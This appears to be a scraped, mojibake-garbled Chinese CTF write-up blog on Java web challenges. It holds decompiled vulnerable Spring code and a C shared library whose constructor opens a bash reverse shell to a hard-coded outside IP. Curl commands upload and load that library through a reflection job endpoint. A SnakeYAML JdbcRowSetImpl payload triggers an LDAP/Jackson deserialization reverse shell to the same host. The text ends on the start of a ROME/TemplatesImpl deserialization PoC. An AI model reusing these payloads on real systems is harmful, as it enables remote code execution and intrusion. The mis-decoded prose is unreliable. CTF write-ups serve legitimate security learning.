info.put(\u0026#34;uploadDir\u0026#34;, \u0026#34;/tmp/uploads\u0026#34;); Charset gbk = Charset.forName(\u0026#34;GBK\u0026#34;); byte[] bytes = gbk.encode(\u0026#34;ä½ å¥½\u0026#34;).array(); System.out.println(Arrays.toString(bytes)); return info; } @PostMapping({\u0026#34;/upload\u0026#34;}) public Map\u0026lt;String, String\u0026gt; uploadFile(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile file) { String originalFilename; Map\u0026lt;String, String\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); try { File dir = new File(\u0026#34;/tmp/uploads/\u0026#34;); if (!dir.exists()) { dir.mkdirs(); } originalFilename = file.getOriginalFilename(); } catch (Exception e) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, e.getMessage()); } if (originalFilename == null) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;æ–‡ä»¶åä¸ºç©º\u0026#34;); return result; } String filename = new File(originalFilename).getName(); if (filename.contains(CallerDataConverter.DEFAULT_RANGE_DELIMITER) || filename.contains(\u0026#34;/\u0026#34;) || filename.contains(\u0026#34;\\\\\u0026#34;) || filename.startsWith(\u0026#34;.\u0026#34;)) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;éæ³•æ–‡ä»¶å\u0026#34;); return result; } File dest = new File(\u0026#34;/tmp/uploads/\u0026#34; + filename); String uploadPathCanonical = new File(\u0026#34;/tmp/uploads/\u0026#34;).getCanonicalPath(); String destCanonical = dest.getCanonicalPath(); if (!destCanonical.startsWith(uploadPathCanonical + File.separator)) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;éæ³•æ–‡ä»¶è·¯å¾„\u0026#34;); return result; } file.transferTo(dest); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;path\u0026#34;, dest.getAbsolutePath()); result.put(\u0026#34;message\u0026#34;, \u0026#34;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#34;); return result; } @PostMapping({\u0026#34;/job/add\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; addJob(@RequestBody ScheduledJob job) { Map\u0026lt;String, Object\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); if (containsBlacklist(job.getInvokeTarget())) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;åŒ…å«éæ³•å­—ç¬¦\u0026#34;); return result; } if (!containsWhitelist(job.getInvokeTarget())) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;ç›®æ ‡ä¸åœ¨ç™½åå•ä¸­\u0026#34;); return result; } jobs.put(job.getJobName(), job); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;ä»»åŠ¡æ·»åŠ æˆåŠŸ\u0026#34;); result.put(\u0026#34;jobId\u0026#34;, job.getJobName()); return result; } @PostMapping({\u0026#34;/job/run/{jobName}\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; runJob(@PathVariable String jobName) { Map\u0026lt;String, Object\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); ScheduledJob job = jobs.get(jobName); if (job == null) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;ä»»åŠ¡ä¸å­˜åœ¨\u0026#34;); return result; } try { invokeMethod(job.getInvokeTarget()); result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;success\u0026#34;); result.put(\u0026#34;message\u0026#34;, \u0026#34;ä»»åŠ¡æ‰§è¡ŒæˆåŠŸ\u0026#34;); } catch (Exception e) { result.put(BindTag.STATUS_VARIABLE_NAME, \u0026#34;error\u0026#34;); result.put(\u0026#34;message\u0026#34;, e.getMessage()); result.put(\u0026#34;stackTrace\u0026#34;, e.getStackTrace()[0].toString()); } return result; } private boolean containsBlacklist(String str) { if (str == null) { return false; } String lowerStr = str.toLowerCase(); for (String blackItem : JOB_BLACKLIST) { if (lowerStr.contains(blackItem.toLowerCase())) { return true; } } return false; } private boolean containsWhitelist(String str) { if (str == null) { return false; } for (String whiteItem : JOB_WHITELIST) { if (str.contains(whiteItem)) { return true; } } return false; } private Object invokeMethod(String invokeTarget) throws Exception { int hashIndex = invokeTarget.indexOf(35); if (hashIndex == -1) { throw new IllegalArgumentException(\u0026#34;Invalid format, expected: className#methodName(params)\u0026#34;); } String className = invokeTarget.substring(0, hashIndex); String methodAndParams = invokeTarget.substring(hashIndex + 1); int paramStart = methodAndParams.indexOf(40); int paramEnd = methodAndParams.lastIndexOf(41); if (paramStart == -1 || paramEnd == -1) { throw new IllegalArgumentException(\u0026#34;Invalid method format\u0026#34;); } String methodName = methodAndParams.substring(0, paramStart); String paramStr = methodAndParams.substring(paramStart + 1, paramEnd); Class\u0026lt;?\u0026gt; clazz = Class.forName(className); List\u0026lt;Object\u0026gt; paramValues = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Class\u0026lt;?\u0026gt;\u0026gt; paramTypes = new ArrayList\u0026lt;\u0026gt;(); if (!paramStr.trim().isEmpty()) { String[] params = splitParams(paramStr); for (String str : params) { String param = str.trim(); if (param.startsWith(\u0026#34;\u0026#39;\u0026#34;) \u0026amp;\u0026amp; param.endsWith(\u0026#34;\u0026#39;\u0026#34;)) { String value = param.substring(1, param.length() - 1); paramValues.add(value); paramTypes.add(String.class); } else if (param.equals(BeanDefinitionParserDelegate.NULL_ELEMENT)) { paramValues.add(null); paramTypes.add(String.class); } else if (param.matches(\u0026#34;\\\\d+\u0026#34;)) { paramValues.add(Integer.valueOf(Integer.parseInt(param))); paramTypes.add(Integer.TYPE); } else if (param.equals(\u0026#34;true\u0026#34;) || param.equals(\u0026#34;false\u0026#34;)) { paramValues.add(Boolean.valueOf(Boolean.parseBoolean(param))); paramTypes.add(Boolean.TYPE); } else { paramValues.add(param); paramTypes.add(String.class); } } } try { Method method = clazz.getMethod(methodName, (Class[]) paramTypes.toArray(new Class[0])); if (Modifier.isStatic(method.getModifiers())) { return method.invoke(null, paramValues.toArray()); } Object instance = clazz.newInstance(); return method.invoke(instance, paramValues.toArray()); } catch (NoSuchMethodException e) { Method method2 = clazz.getDeclaredMethod(methodName, (Class[]) paramTypes.toArray(new Class[0])); method2.setAccessible(true); if (Modifier.isStatic(method2.getModifiers())) { return method2.invoke(null, paramValues.toArray()); } Object instance2 = clazz.newInstance(); return method2.invoke(instance2, paramValues.toArray()); } } private String[] splitParams(String paramStr) { List\u0026lt;String\u0026gt; params = new ArrayList\u0026lt;\u0026gt;(); int bracketLevel = 0; int start = 0; for (int i = 0; i \u0026lt; paramStr.length(); i++) { char c = paramStr.charAt(i); if (c == \u0026#39;(\u0026#39; || c == \u0026#39;{\u0026#39; || c == \u0026#39;[\u0026#39;) { bracketLevel++; } else if (c == \u0026#39;)\u0026#39; || c == \u0026#39;}\u0026#39; || c == \u0026#39;]\u0026#39;) { bracketLevel--; } else if (c == \u0026#39;,\u0026#39; \u0026amp;\u0026amp; bracketLevel == 0) { params.add(paramStr.substring(start, i)); start = i + 1; } } if (start \u0026lt; paramStr.length()) { params.add(paramStr.substring(start)); } return (String[]) params.toArray(new String[0]); } /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/VulnController$ScheduledJob.class */ static class ScheduledJob { private String jobName; private String invokeTarget; private String cronExpression; ScheduledJob() { } public String getJobName() { return this.jobName; } public void setJobName(String jobName) { this.jobName = jobName; } public String getInvokeTarget() { return this.invokeTarget; } public void setInvokeTarget(String invokeTarget) { this.invokeTarget = invokeTarget; } public String getCronExpression() { return this.cronExpression; } public void setCronExpression(String cronExpression) { this.cronExpression = cronExpression; } } } å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è·¯ç”±ï¼Œä¸»è¦å°±æ˜¯å¦‚ä¸‹å‡ ä¸ªé™åˆ¶ï¼š\næ–‡ä»¶åä¸èƒ½åŒ…å«.. æ–‡ä»¶åä¸èƒ½åŒ…å«/ æ–‡ä»¶åä¸èƒ½åŒ…å«\\\\ æ–‡ä»¶åä¸èƒ½ä»¥.å¼€å§‹ ä½†æ˜¯å¯¹å…¶å®ƒå°±æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå¹¶ä¸”å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ã€‚\nå…¶æ¬¡æ¯”è¾ƒå…³é”®çš„å°±æ˜¯å¯ä»¥æ·»åŠ ä»»åŠ¡å’Œè¿è¡Œä»»åŠ¡ï¼Œåœ¨è¿è¡Œä»»åŠ¡çš„è·¯ç”±è°ƒç”¨äº†éå¸¸å…³é”®çš„invokeMethod()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„é€»è¾‘å…¶å®å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åå°„è°ƒç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ å…¥ç±»ä¼¼ï¼š\n1 java.lang.ProcessBuilder#start([\u0026#39;bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;id\u0026#39;]) è¿™ç§æ ¼å¼çš„è¯­å¥å°±å¯ä»¥è¿›è¡Œæ–¹æ³•çš„åå°„è°ƒç”¨ï¼Œå‰é¢å¿…é¡»æ˜¯ç±»ï¼Œåªèƒ½è°ƒç”¨æ­¤ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä»£ç é€»è¾‘å®ç°äº†è‡ªåŠ¨è¯†åˆ«å‚æ•°ç±»å‹ï¼Œç„¶åè‡ªåŠ¨è°ƒç”¨getMethod()è·å–æ–¹æ³•å¹¶invokeæ¥æ‰§è¡Œå®ƒã€‚\nä½†æ˜¯åœ¨add jobæ—¶ï¼Œæœ‰é»‘ç™½åå•ï¼š\n1 2 private static final String[] JOB_BLACKLIST = {\u0026#34;java.net.URL\u0026#34;, \u0026#34;javax.naming.InitialContext\u0026#34;, \u0026#34;org.yaml.snakeyaml\u0026#34;, \u0026#34;org.springframework\u0026#34;, \u0026#34;org.apache\u0026#34;, \u0026#34;rmi\u0026#34;, \u0026#34;ldap\u0026#34;, \u0026#34;ldaps\u0026#34;, \u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;}; private static final String[] JOB_WHITELIST = {\u0026#34;com.jabaez.FLAG\u0026#34;}; è¦æ±‚æˆ‘ä»¬è®¾ç½®çš„invokeTargetå¿…é¡»æœ‰è‡ªå®šä¹‰å®ç°çš„FLAGç±»çš„å…³é”®å­—ï¼ŒFLAGç±»å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.jabaez; /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/FLAG.class */ public class FLAG { private String flag; public FLAG() { } public FLAG(String flag) { this.flag = flag; } public String getFlag() { return this.flag; } public void setFlag(String flag) { this.flag = flag; } } å¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”å¯ä»¥æ‰§è¡Œjavaä»£ç ï¼Œè¿™é‡Œå¯ä»¥æ‰“jniï¼Œä¸Šä¼ ä¸€ä¸ªåŒ…å«ç™½åå•çš„æ–‡ä»¶åï¼Œç„¶åå†è°ƒç”¨System.load()ç›´æ¥åŠ è½½å³å¯ï¼Œç›´æ¥å¼€å¹²ï¼š\nå…ˆåœ¨linuxä¸Šç”Ÿæˆä¸€ä¸ªsoæ–‡ä»¶ï¼š\nå…ˆç”Ÿæˆcom.jabaez.FLAG.cæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } ç„¶åç¼–è¯‘æˆsoæ–‡ä»¶ï¼š\n1 gcc -shared -fPIC com.jabaez.FLAG.c -o com.jabaez.FLAG.so æ‰“åŒ…å¥½soæ–‡ä»¶ï¼Œç›´æ¥ä¸Šé¢˜äº†ã€‚\nç„¶åä¸Šä¼ æ–‡ä»¶å³å¯ï¼š\n1 2 curl -X POST \u0026#34;http://pss.idss-cn.com:23474/api/upload\u0026#34; \\ -F \u0026#34;file=@com.jabaez.FLAG.so\u0026#34; å¢åŠ ä»»åŠ¡ï¼ˆåç«¯ä»£ç çš„æ¥å—ç±»çš„æ ¼å¼è¦æ±‚ï¼‰ï¼š\n1 2 3 4 5 6 7 curl -X POST http://pss.idss-cn.com:23474/api/job/add \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;jobName\u0026#34;: \u0026#34;Job\u0026#34;, \u0026#34;invokeTarget\u0026#34;: \u0026#34;java.lang.System#load(\u0026#39;/tmp/uploads/com.jabaez.FLAG.so\u0026#39;)\u0026#34;, \u0026#34;cronExpression\u0026#34;: \u0026#34;0/5 * * * * ?\u0026#34; }\u0026#39; ç„¶åæ‰§è¡Œä»»åŠ¡ï¼š\n1 curl -X POST http://pss.idss-cn.com:23474/api/job/run/Job éœ€è¦æ³¨æ„è¿™é‡Œçš„runè·¯ç”±è¦æ±‚postæ–¹æ³•ã€‚\nå³å¯åå¼¹shellæ‹¿åˆ°flag:\nä½†æ˜¯åªèƒ½å¼¹ä¸€æ¬¡ï¼Œç„¶ååç»­å°±ä¼šå› ä¸ºè¢«åŠ è½½è¿‡è€Œä¸ä¼šå†æ¬¡åŠ è½½ï¼Œè¿‡ç¨‹å°±å’Œjniçš„è°ƒè¯•è¿‡ç¨‹ä¸€æ ·ï¼Œå†æƒ³æ‰“å°±åªæœ‰é‡æ–°ä¸Šä¼ å¦å¤–å‘½åçš„soæ–‡ä»¶æˆ–è€…é‡å¼€ç¯å¢ƒã€‚\nå½“ç„¶è¿˜å¯ä»¥æ‰“\n1 2 3 4 5 6 7 curl -X POST http://pss.idss-cn.com:23510/api/job/add \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;jobName\u0026#34;: \u0026#34;Job\u0026#34;, \u0026#34;invokeTarget\u0026#34;: \u0026#34;com.sun.glass.utils.NativeLibLoader#loadLibrary(\u0026#39;../../../../../../../../../../../tmp/uploads/com.jabaez.FLAG\u0026#39;)\u0026#34;, \u0026#34;cronExpression\u0026#34;: \u0026#34;0/5 * * * * ?\u0026#34; }\u0026#39; â€”â€”â€”â€”â€”â€”â€”â€”\nezyaml è¯·ç”¨ä¸€å¥è¯è¯æ˜ä½ ç²¾é€š Java System.out.println(\u0026ldquo;Hello World\u0026rdquo;);\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç»™äº†é™„ä»¶ï¼Œjava8ï¼Œspringboot2ï¼Œæœ‰ä¸€ä¸ªsnakeyamlä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.yaml\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;snakeyaml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.33\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; çœ‹jaråŒ…å­˜åœ¨springbooté»˜è®¤å°±æœ‰çš„jackson:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 - \u0026#34;BOOT-INF/lib/spring-boot-2.7.18.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.7.18.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.12.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.12.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.33.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.18.jar\u0026#34; å†çœ‹è·¯ç”±ï¼Œç®€å•æ˜äº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.example.ezyaml.controller; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.yaml.snakeyaml.Yaml; @RestController /* loaded from: ezyaml-1.0-SNAPSHOT.jar:BOOT-INF/classes/com/example/ezyaml/controller/IndexController.class */ public class IndexController { private static final String[] blacklist = {\u0026#34;ClassPath\u0026#34;, \u0026#34;DataSource\u0026#34;, \u0026#34;URLClassLoader\u0026#34;, \u0026#34;ScriptEngine\u0026#34;}; @RequestMapping({\u0026#34;/\u0026#34;}) public String index() { return \u0026#34;Hello ezyaml, Post /yaml param:yamlContent\u0026#34;; } @PostMapping({\u0026#34;/yaml\u0026#34;}) public String yaml(@RequestParam String yamlContent) { Yaml yaml = new Yaml(); try { for (String b : blacklist) { if (yamlContent.contains(b)) { return \u0026#34;å­˜åœ¨éæ³•å…³é”®å­—\u0026#34;; } } return yaml.loadAs(yamlContent, Object.class).toString(); } catch (Exception e) { return e.getMessage(); } } } yamlè·¯ç”±å­˜åœ¨snakeyamlååºåˆ—åŒ–ï¼Œæœ‰é»‘åå•ï¼Œä¸€çœ‹åˆ°è¿™ä¸ªé¢˜ä»¥ä¸ºæ˜¯è€ƒçš„æœ€è¿‘å‘çš„snakeyamlçš„rceï¼š\nã€ŠSnakeYaml ä¸å‡ºç½‘ RCE æ–°é“¾ï¼ˆJDKåŸç”Ÿé“¾ï¼‰æŒ–æ˜ã€‹\nç»“æœæœ¬åœ°å‡ºäº†é¢˜ç›®ä¸­æ²¡å‡ºï¼Œæœ¬åœ°æ˜¯jdk8u71ï¼Œä»è¿œç¨‹ç¯å¢ƒçš„å›æ˜¾æ¥çœ‹æ˜¯æ²¡æœ‰com.sun.javafx.iio.ImageFrameç±»ï¼Œé‚£ä¹ˆå°±æ‰“å¸¸è§„çš„snakeyamlååºåˆ—åŒ–è°ƒç”¨setteræ–¹æ³•æ‰“jndiï¼Œæ‰“JdbcRowSetImplå°±è¡Œï¼ŒæŒºå¸¸è§äº†çš„ï¼Œå°±æ˜¯å®ƒçš„setterå›è°ƒç”¨åˆ°ç±»ä¸­çš„connect()æ–¹æ³•ï¼Œç„¶åå¯ä»¥æ‰“Jndiï¼š\néœ€è¦ä¸¤æ¬¡setterï¼Œä¸€æ¬¡è®¾ç½®dataSourceå€¼ï¼Œä¸€æ¬¡è°ƒç”¨åˆ°connect()æ–¹æ³•ï¼Œä½†æ˜¯å°è¯•ç›´æ¥åœ¨è·å–ç±»æ—¶æ‰“ä¸äº†ï¼Œå°è¯•æ‰“é«˜ç‰ˆæœ¬çš„jndiæ‰“æ³•ï¼Œå¯ä»¥å°è¯•æ‰“ç”¨ldapååºåˆ—åŒ–æ•°æ®è¾¾åˆ°ååºåˆ—åŒ–æ”»å‡»çš„æ•ˆæœï¼Œæ­£å¥½springbootä¸­å­˜åœ¨jacksonï¼Œé‚£ä¹ˆå°±ååºåˆ—åŒ–æ‰“jacksonï¼Œç”¨jndimapå·¥å…·æ¥æ‰“ï¼š\nå¯åŠ¨ç›‘å¬ï¼š\nåå¼¹shellç›‘å¬ç«¯å£ï¼š\nç„¶ååœ¨é¢˜ç›®ä¸­æ‰“å…¥payload:\n1 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \u0026#34;ldap://47.100.223.173:1389/Deserialize/Jackson/ReverseShell/47.100.223.173/2333\u0026#34;, autoCommit: true} å¦‚ä¸‹ï¼š\næˆåŠŸåå¼¹shellæ‹¿åˆ°flagï¼š\nflagå¦‚ä¸‹ï¼š\n1 flag{yo9kfwKt6WDXup2TmSxeNO3QE7Igd5Js} ä¸æ‡‚ä¸ºä»€ä¹ˆç»™ä¸ªæç¤ºè¯´é¢˜ç›®ä¸å‡ºç½‘ï¼Œä½†æ˜¯æˆ‘è¿˜å¾ˆæ€ªä¸ºä»€ä¹ˆldapèƒ½æ¥å—åˆ°è¯·æ±‚ç»“æœè¯´ä¸å‡ºç½‘ï¼Œå¯èƒ½æ˜¯æƒ³è€ƒä¸‹é¢è¿™ä¸ªï¼Ÿ\nã€Šä» SnakeYaml çœ‹ ClassPathXmlApplicationContext ä¸å‡ºç½‘åˆ©ç”¨ã€‹\nåé¢è¦å­¦snakeyamlå·®ä¸å¤šçœ‹è¿™ä¸¤ç¯‡æ–‡ç« å°±è¡Œäº†ã€‚\n","date":"2025-08-07T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp/","title":"ç¬¬åå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›wp"},{"content":"JavaäºŒæ¬¡ååºåˆ—åŒ– äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå°±æ˜¯ååºåˆ—åŒ–ä¸¤æ¬¡ï¼Œå®ƒä¸»è¦ç”¨äºä¸¤ä¸ªç»•è¿‡ï¼š\né»‘åå•çš„é™åˆ¶\nä¸å‡ºç½‘åˆ©ç”¨\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u71 SignedObjectç±» è¿™ä¸ªç±»ä½äºjava.security.SignedObjectï¼Œè¿™ä¸ªç±»æ˜¯ç”¨äºåˆ›å»ºçœŸå®è¿è¡Œæ—¶å¯¹è±¡çš„ç±»ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯SignedObjectåŒ…å«å¦ä¸€ä¸ªSerializableå¯¹è±¡ã€‚\næ¥çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œåºåˆ—åŒ–çš„å¯¹è±¡ä¸ºobjectå‚æ•°ã€‚\nå†è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªç±»çš„getObjectæ–¹æ³•ï¼š å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå¹¶ä¸”è¿™é‡Œçš„this.contentå°±æ˜¯å‰é¢çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å…¶å®æ˜¯å¯æ§çš„ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„SignedObjectå¯¹è±¡ï¼š\n1 2 3 4 KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(æ¶æ„å¯¹è±¡ï¼Œkp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); ç„¶åå°±æ˜¯æƒ³åœ¨å“ªé‡Œè°ƒç”¨è¿™ä¸ªSignedObjectå¯¹è±¡çš„getObject()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è°ƒç”¨åˆ°getteræ–¹æ³•ï¼Œè€Œå¯¹äºè°ƒç”¨getteræ–¹æ³•ï¼Œå‰é¢æ¯”è¾ƒç»å…¸çš„å­¦äº†çš„å°±æ˜¯Romeé“¾å’ŒCBé“¾ï¼Œä¸‹é¢æˆ‘ä»¬å°±å…ˆæ¥ç®€å•çœ‹çœ‹è¿™ä¸¤æ¡é“¾å­çš„åˆ©ç”¨ã€‚\nåˆ©ç”¨æ‰‹æ®µ romeé“¾çš„åˆ©ç”¨ å®Œç¾ç¬¦åˆï¼Œä¸‰æ¡é“¾å­éƒ½æ˜¯è·å–getteræ–¹æ³•æ¥å‘½ä»¤æ‰§è¡Œï¼Œæ­£å¥½å¯ä»¥å¾—åˆ°å‰é¢çš„getObject()æ–¹æ³•ã€‚ä¸‹é¢æ¥æ„é€ ä¸€ä¸‹ã€‚\næ€»çš„æ€è·¯éƒ½æ˜¯å…ˆä¼ å…¥ä¸€ä¸ªæ„é€ å¥½äº†çš„SignedObjectç±»ï¼Œç„¶ååœ¨è°ƒç”¨åˆ°ä»–çš„getObject()æ–¹æ³•æ—¶ååºåˆ—åŒ–æ¶æ„å¯¹è±¡ã€‚\ntoStringé“¾ åŸæœ¬çš„toStringé“¾çš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ¥ç®€å•æ”¹æ”¹ã€‚\nè¿˜æ˜¯ç”¨åŠ¨æ€åŠ è½½å­—èŠ‚ç æ¥æ‰“ï¼Œä½†è¿™é‡Œå°±ä½¿ç”¨javassistæ¥ç”Ÿæˆï¼Œå…·ä½“çš„ä¿®æ”¹æ€è·¯å°±æ˜¯è°ƒç”¨ä¸¤æ¬¡toStringï¼Œä»è€Œå¯ä»¥è°ƒç”¨åˆ°SignedObjectç±»çš„getteræ–¹æ³•ï¼Œä»è€Œæ¥è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„è°ƒç”¨é“¾ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 